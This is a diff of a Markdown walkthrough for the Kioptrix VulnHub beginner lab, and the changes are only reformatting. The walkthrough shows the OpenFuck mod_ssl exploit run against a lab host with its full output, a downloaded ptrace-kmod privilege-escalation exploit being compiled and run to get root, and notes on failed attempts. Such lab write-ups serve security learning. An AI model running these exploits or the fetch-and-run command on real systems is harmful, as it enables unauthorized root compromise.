@@ -73,48 +73,48 @@ The vulnerable service is
 
 * link on how i solved the compilation error: [http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html](http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html)
 
-* after compiling and generated the exec file, run this command` ./openfuck 0x6b 192.168.8.4 443 -c 40`
+* after compiling and generated the exec file, run this command`./openfuck 0x6b 192.168.8.4 443 -c 40`
 
-    kaipowered@debian:~/Documents/Vulnhub/Kioptrix$ ./openfuck 0x6b 192.168.8.4 443 -c 40
+      kaipowered@debian:~/Documents/Vulnhub/Kioptrix$ ./openfuck 0x6b 192.168.8.4 443 -c 40
 
-    *******************************************************************
-    * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
-    *******************************************************************
-    * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
-    * #hackarena  irc.brasnet.org                                     *
-    * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
-    * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
-    * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
-    *******************************************************************
+      *******************************************************************
+      * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+      *******************************************************************
+      * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+      * #hackarena  irc.brasnet.org                                     *
+      * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+      * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+      * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+      *******************************************************************
 
-    Connection... 40 of 40
-    Establishing SSL connection
-    cipher: 0x4043808c   ciphers: 0x80f81e8
-    Ready to send shellcode
-    Spawning shell...
-    bash: no job control in this shell
-    bash-2.05$ 
-    exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
-    --03:14:47--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
-               => `ptrace-kmod.c'
-    Connecting to dl.packetstormsecurity.net:80... connected!
-    HTTP request sent, awaiting response... 301 Moved Permanently
-    Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
-    --03:14:48--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
-               => `ptrace-kmod.c'
-    Connecting to dl.packetstormsecurity.net:443... connected!
-    HTTP request sent, awaiting response... 200 OK
-    Length: 3,921 [text/x-csrc]
+      Connection... 40 of 40
+      Establishing SSL connection
+      cipher: 0x4043808c   ciphers: 0x80f81e8
+      Ready to send shellcode
+      Spawning shell...
+      bash: no job control in this shell
+      bash-2.05$ 
+      exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
+      --03:14:47--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+                 => `ptrace-kmod.c'
+      Connecting to dl.packetstormsecurity.net:80... connected!
+      HTTP request sent, awaiting response... 301 Moved Permanently
+      Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+      --03:14:48--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+                 => `ptrace-kmod.c'
+      Connecting to dl.packetstormsecurity.net:443... connected!
+      HTTP request sent, awaiting response... 200 OK
+      Length: 3,921 [text/x-csrc]
 
-        0K ...                                                   100% @ 478.64 KB/s
+          0K ...                                                   100% @ 478.64 KB/s
 
-    03:14:50 (478.64 KB/s) - `ptrace-kmod.c' saved [3921/3921]
+      03:14:50 (478.64 KB/s) - `ptrace-kmod.c' saved [3921/3921]
 
-    [+] Attached to 6502
-    [+] Waiting for signal
-    [+] Signal caught
-    [+] Shellcode placed at 0x4001189d
-    [+] Now wait for suid shell...
+      [+] Attached to 6502
+      [+] Waiting for signal
+      [+] Signal caught
+      [+] Shellcode placed at 0x4001189d
+      [+] Now wait for suid shell...
 
 we got root!
 
@@ -122,6 +122,9 @@ Note:
 
 ```
 I tried dirbustering the web server but i haven't found any interesting files/directories.
+```
+
+```
 
 I also searched some available exploits in rpcbind but in turns out that the nfs protocol must be present or active in order to exploit the rpc service.
 
@@ -129,6 +132,8 @@ I also tried the exploit/multi/samba/usermap\_script but it didn't work.
 
 This vm is for beginners.
 ```
+
+
 
 
 
